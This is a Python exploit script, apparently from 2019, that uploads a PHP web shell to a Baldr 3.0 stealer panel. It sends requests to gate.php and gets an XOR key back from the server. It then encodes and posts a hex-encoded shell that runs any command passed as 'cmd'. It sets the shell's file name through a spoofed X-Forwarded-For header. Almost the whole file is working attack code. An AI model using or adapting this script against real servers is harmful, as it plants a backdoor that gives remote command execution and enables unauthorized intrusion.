#Baldr 3.0 shell upload, april 2019
#Author: @misterch0c & @rogue_kdc
import requests
import sys

#powny shell
buf = b"\x3c\x48\x54\x4d\x4c\x3e\x3c\x42\x4f\x44\x59\x3e\x0a\x3c\x46\x4f\x52\x4d\x20\x4d\x45\x54\x48\x4f\x44\x3d\x22\x47\x45\x54\x22\x20\x4e\x41\x4d\x45\x3d\x22\x6d\x79\x66\x6f\x72\x6d\x22\x20\x41\x43\x54\x49\x4f\x4e\x3d\x22\x22\x3e\x0a\x3c\x49\x4e\x50\x55\x54\x20\x54\x59\x50\x45\x3d\x22\x74\x65\x78\x74\x22\x20\x4e\x41\x4d\x45\x3d\x22\x63\x6d\x64\x22\x3e\x0a\x3c\x49\x4e\x50\x55\x54\x20\x54\x59\x50\x45\x3d\x22\x73\x75\x62\x6d\x69\x74\x22\x20\x56\x41\x4c\x55\x45\x3d\x22\x53\x65\x6e\x64\x22\x3e\x0a\x3c\x2f\x46\x4f\x52\x4d\x3e\x0a\x3c\x70\x72\x65\x3e\x0a\x3c\x3f\x70\x68\x70\x0a\x69\x66\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x20\x7b\x0a\x20\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b\x0a\x20\x20\x7d\x0a\x3f\x3e\x0a\x3c\x2f\x70\x72\x65\x3e\x0a\x3c\x2f\x42\x4f\x44\x59\x3e\x3c\x2f\x48\x54\x4d\x4c\x3e"

proxies = {"http":"127.0.0.1:8080", "https":"127.0.0.1:8080"}
headers = {
    "X-Forwarded-For":".ayy.php",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"
}

url = sys.argv[1]
url = "http://"+ url + "/gate.php"
r = requests.post(url, headers=headers, data="", proxies=proxies)
print(r.text)
xor_key = r.text[:4]

def myxor(data, key):
    j=0
    key = list(key)
    data = list(data)
    tmp = list()
    for i in range(len(data)):
        tmp.append(data[i]^key[j])
        j += 1
        if j > (len(key)-1):
            j = 0
    return tmp

payload = myxor(buf, xor_key.encode("utf-8"))
r = requests.post(url, headers=headers, data=bytearray(payload), proxies=proxies)
print("Shell should be at {}".format("http://"+sys.argv[1]+"/tmp/.ayy.php"))
    
    

